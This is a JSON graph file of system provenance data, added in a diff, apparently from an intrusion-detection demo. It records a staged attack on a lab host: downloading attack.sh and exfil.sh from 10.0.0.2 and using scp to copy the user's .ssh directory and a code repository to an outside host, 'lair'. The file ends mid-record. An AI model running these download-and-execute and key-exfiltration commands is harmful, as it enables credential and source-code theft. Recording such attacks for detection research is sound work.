@@ -1,0 +1,4091 @@
+{
+  "elements": {
+    "nodes": [
+      {
+        "data": {
+          "authority": "00000000-0000-0000-0000-000000000001",
+          "client": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "client_ip": "192.168.100.20",
+          "client_port": "57741",
+          "confidence": 0,
+          "id": "369742",
+          "method": "kafka-streams-4tuple-reconciliation",
+          "server": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "server_ip": "192.168.100.10",
+          "server_port": "22",
+          "type": "connection",
+          "label": "192.168.100.20:57741\n192.168.100.10:22"
+        },
+        "position": {
+          "x": 4128.578173323342,
+          "y": 1295.6403750638685
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "connection"
+      },
+      {
+        "data": {
+          "external": false,
+          "first_seen": 1498617983236012300,
+          "id": "369448",
+          "ips": [
+            "192.168.100.10"
+          ],
+          "names": [
+            "git.bovia.org"
+          ],
+          "type": "machine",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "label": "git.bovia.org"
+        },
+        "position": {
+          "x": 4718.1050742466305,
+          "y": 1267.459654164908
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "machine"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369616",
+          "name": [
+            "192.168.100.20:57741"
+          ],
+          "names": [
+            "192.168.100.20:57741"
+          ],
+          "parent": "369448",
+          "timestamp": 1498617983601696000,
+          "type": "socket-version",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:f92bbd3f-5bab-11e7-bb0d-080027d14c67",
+          "label": "192.168.100.20:57741"
+        },
+        "position": {
+          "x": 4306.48318909245,
+          "y": 1229.4273852386416
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "external": false,
+          "first_seen": 1498617975488727800,
+          "id": "367741",
+          "ips": [
+            "192.168.100.20"
+          ],
+          "names": [
+            "cto.bovia.org"
+          ],
+          "type": "machine",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "label": "cto.bovia.org"
+        },
+        "position": {
+          "x": 3279.1317346437586,
+          "y": 1972.9806674041015
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "machine"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369612",
+          "name": [
+            "192.168.100.10:22"
+          ],
+          "names": [
+            "192.168.100.10:22"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617984247637800,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f98e37a1-5bab-11e7-aa28-080027d14c66",
+          "label": "192.168.100.10:22"
+        },
+        "position": {
+          "x": 4136.01498282729,
+          "y": 1598.6031787054894
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "cmdline": "/bin/sh /tmp/vagrant-shell",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368251",
+          "last_update": 1498617976092717800,
+          "parent": "367741",
+          "pid": "6417",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f4b206ec-5bab-11e7-aa1c-080027d14c66",
+          "label": "/bin/sh /tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 2140.836751560254,
+          "y": 1569.9035595971673
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "sshd",
+          "egid": null,
+          "euid": null,
+          "gid": null,
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369614",
+          "last_update": 1498617983601696000,
+          "parent": "369448",
+          "pid": 764,
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": false,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": null,
+          "username": null,
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:027cb623-5b7b-11e7-b1a2-080027d14c67",
+          "label": "sshd"
+        },
+        "position": {
+          "x": 4442.043642118466,
+          "y": 1140.6509473012575
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/sbin/sshd -R",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369617",
+          "last_update": 1498617983901431800,
+          "parent": "369448",
+          "pid": "6986",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "0",
+          "username": null,
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:f92c19b3-5bab-11e7-bb0d-080027d14c67",
+          "label": "/usr/sbin/sshd -R"
+        },
+        "position": {
+          "x": 4555.368989512179,
+          "y": 1205.0716864949006
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "sh -c scp -r -f .",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369877",
+          "last_update": 1498617984076247000,
+          "parent": "369448",
+          "pid": "6989",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:f971c96a-5bab-11e7-bb0e-080027d14c67",
+          "label": "sh -c scp -r -f ."
+        },
+        "position": {
+          "x": 4820.829855385731,
+          "y": 1177.6822546024148
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/sbin/sshd -R",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369855",
+          "last_update": 1498617983954012700,
+          "parent": "369448",
+          "pid": "6988",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:f95f1fce-5bab-11e7-bb0d-080027d14c67",
+          "label": "/usr/sbin/sshd -R"
+        },
+        "position": {
+          "x": 4678.8968796774225,
+          "y": 1162.2756991628914
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "scp -r -f .",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "369899",
+          "last_update": 1498617984096212700,
+          "parent": "369448",
+          "pid": "6989",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:f971c96a-5bab-11e7-bb0e-080027d14c67",
+          "label": "scp -r -f ."
+        },
+        "position": {
+          "x": 4952.457547040282,
+          "y": 1160.563859669611
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -- git scp -r -f .",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369570",
+          "last_update": 1498617984222576000,
+          "parent": "367741",
+          "pid": "6453",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f9849057-5bab-11e7-aa28-080027d14c66",
+          "label": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -- git scp -r -f ."
+        },
+        "position": {
+          "x": 4141.973290267559,
+          "y": 1772.9161306628903
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/bin/sh .rustup/exfil.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368739",
+          "last_update": 1498617977312988200,
+          "parent": "367741",
+          "pid": "6428",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f56c347a-5bab-11e7-aa1d-080027d14c66",
+          "label": "/bin/sh .rustup/exfil.sh"
+        },
+        "position": {
+          "x": 3693.486873402145,
+          "y": 1719.7306721745983
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "scp -r git: .",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369541",
+          "last_update": 1498617984140872200,
+          "parent": "367741",
+          "pid": "6452",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f97e3d82-5bab-11e7-aa27-080027d14c66",
+          "label": "scp -r git: ."
+        },
+        "position": {
+          "x": 4013.2238258668153,
+          "y": 1770.879729100621
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/bin/sh attack.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368723",
+          "last_update": 1498617977292714800,
+          "parent": "367741",
+          "pid": "6427",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f5691827-5bab-11e7-aa1d-080027d14c66",
+          "label": "/bin/sh attack.sh"
+        },
+        "position": {
+          "x": 3161.1989299880474,
+          "y": 1720.6235154988592
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368274",
+          "last_update": 1498617976118058800,
+          "parent": "367741",
+          "pid": "6419",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f4b5e1b9-5bab-11e7-aa1c-080027d14c66",
+          "label": "sh"
+        },
+        "position": {
+          "x": 2367.1337514210772,
+          "y": 1704.315947594215
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "curl http://rustup/scripts/rustup.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368269",
+          "last_update": 1498617976113781200,
+          "parent": "367741",
+          "pid": "6418",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f4b54ec4-5bab-11e7-aa1c-080027d14c66",
+          "label": "curl http://rustup/scripts/rustup.sh"
+        },
+        "position": {
+          "x": 2355.6318728868955,
+          "y": 1523.1743868745932
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "external": true,
+          "first_seen": 1498617975488727800,
+          "id": "367743",
+          "ips": [
+            "10.0.2.2"
+          ],
+          "names": [],
+          "type": "machine",
+          "uuid": null,
+          "label": ""
+        },
+        "position": {
+          "x": 1344.2436974227337,
+          "y": 1469.5459417615577
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "machine"
+      },
+      {
+        "data": {
+          "cmdline": "sh -c scp -t /tmp/vagrant-shell",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368116",
+          "last_update": 1498617975889755000,
+          "parent": "367741",
+          "pid": "6412",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f490c12d-5bab-11e7-aa18-080027d14c66",
+          "label": "sh -c scp -t /tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 1712.3609648915467,
+          "y": 1794.3545549118821
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/sbin/sshd -R",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "367959",
+          "last_update": 1498617975606667300,
+          "parent": "367741",
+          "pid": "6406",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f46724a7-5bab-11e7-aa12-080027d14c66",
+          "label": "/usr/sbin/sshd -R"
+        },
+        "position": {
+          "x": 1750.493364624097,
+          "y": 1643.489968318862
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368164",
+          "names": [
+            "/tmp/vagrant-shell"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:d88d29be-858d-9d5c-8d85-404bec9d82e3",
+          "label": "/tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 1953.6461098802274,
+          "y": 1823.279024406839
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "scp -t /tmp/vagrant-shell",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368137",
+          "last_update": 1498617975909671200,
+          "parent": "367741",
+          "pid": "6412",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f490c12d-5bab-11e7-aa18-080027d14c66",
+          "label": "scp -t /tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 1809.7580621034417,
+          "y": 1827.0246951528563
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "external": true,
+          "first_seen": 1498617976737787600,
+          "id": "368449",
+          "ips": [
+            "10.0.0.2"
+          ],
+          "names": [
+            "lair.ninja"
+          ],
+          "type": "machine",
+          "uuid": null,
+          "label": "lair.ninja"
+        },
+        "position": {
+          "x": 3263.5532273099334,
+          "y": 1250.6335590445096
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "machine"
+      },
+      {
+        "data": {
+          "cmdline": "wget http://10.0.0.2/scripts/attack-ssh-config",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368629",
+          "last_update": 1498617977123126000,
+          "parent": "367741",
+          "pid": "6425",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f54f3bf3-5bab-11e7-aa1d-080027d14c66",
+          "label": "wget http://10.0.0.2/scripts/attack-ssh-config"
+        },
+        "position": {
+          "x": 2614.4021339070614,
+          "y": 1976.8083396193463
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "scp -F /home/vagrant/.rustup/attack-ssh-config -r /home/vagrant/.ssh natasha@lair:~/stolen-ssh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368755",
+          "last_update": 1498617977340692500,
+          "parent": "367741",
+          "pid": "6429",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f57072c8-5bab-11e7-aa1d-080027d14c66",
+          "label": "scp -F /home/vagrant/.rustup/attack-ssh-config -r /home/vagrant/.ssh natasha@lair:~/stolen-ssh"
+        },
+        "position": {
+          "x": 3960.9383185621973,
+          "y": 2116.0189100363073
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "wget http://10.0.0.2/scripts/exfil.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368459",
+          "last_update": 1498617976798661400,
+          "parent": "367741",
+          "pid": "6423",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f51da7f0-5bab-11e7-aa1d-080027d14c66",
+          "label": "wget http://10.0.0.2/scripts/exfil.sh"
+        },
+        "position": {
+          "x": 3231.557325110504,
+          "y": 1919.3051646317815
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "wget http://10.0.0.2/scripts/attack.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368373",
+          "last_update": 1498617976632719600,
+          "parent": "367741",
+          "pid": "6422",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f5047489-5bab-11e7-aa1d-080027d14c66",
+          "label": "wget http://10.0.0.2/scripts/attack.sh"
+        },
+        "position": {
+          "x": 2721.7350286483775,
+          "y": 1576.0232200884027
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368705",
+          "name": [
+            "10.0.0.2:80"
+          ],
+          "names": [
+            "10.0.0.2:80"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617977219593500,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f55dac94-5bab-11e7-aa1d-080027d14c66",
+          "label": "10.0.0.2:80"
+        },
+        "position": {
+          "x": 2712.834889387371,
+          "y": 1875.0937156468099
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368706",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 2728.6223595559054,
+          "y": 2039.3767664533525
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369467",
+          "names": [
+            "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:89ec131b-c742-9854-82c7-60a534983939",
+          "label": "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+        },
+        "position": {
+          "x": 4970.699581426021,
+          "y": 1862.837386466598
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369466",
+          "names": [
+            "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:89ec131b-c742-9854-82c7-60a534983939",
+          "label": "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+        },
+        "position": {
+          "x": 4901.997778174167,
+          "y": 1830.2447266519441
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "367744",
+          "name": [
+            "10.0.2.2:60511"
+          ],
+          "names": [
+            "10.0.2.2:60511"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617975488727800,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f455dba7-5bab-11e7-aa11-080027d14c66",
+          "label": "10.0.2.2:60511"
+        },
+        "position": {
+          "x": 1582.8354635604214,
+          "y": 1522.9543271950427
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/sbin/sshd -R",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "367745",
+          "last_update": 1498617975580725200,
+          "parent": "367741",
+          "pid": "6404",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "0",
+          "username": null,
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f456225f-5bab-11e7-aa11-080027d14c66",
+          "label": "/usr/sbin/sshd -R"
+        },
+        "position": {
+          "x": 1579.6585915421674,
+          "y": 1644.5406303587783
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "sshd",
+          "egid": null,
+          "euid": null,
+          "gid": null,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "367742",
+          "last_update": 1498617975488727800,
+          "parent": "367741",
+          "pid": 764,
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": false,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": null,
+          "username": null,
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:a6a78089-5ba9-11e7-a0f7-080027d14c66",
+          "label": "sshd"
+        },
+        "position": {
+          "x": 1435.5638878614964,
+          "y": 1644.7323388734935
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368972",
+          "names": [
+            "/etc/passwd"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:53999360-4365-0e55-a543-2d05050e25e6",
+          "label": "/etc/passwd"
+        },
+        "position": {
+          "x": 3688.594780081078,
+          "y": 2031.6425616976196
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "scp -F .rustup/attack-ssh-config -r stealthisrepo natasha@lair:~/stolen-code",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369293",
+          "last_update": 1498617980379904300,
+          "parent": "367741",
+          "pid": "6448",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f7403ad3-5bab-11e7-aa25-080027d14c66",
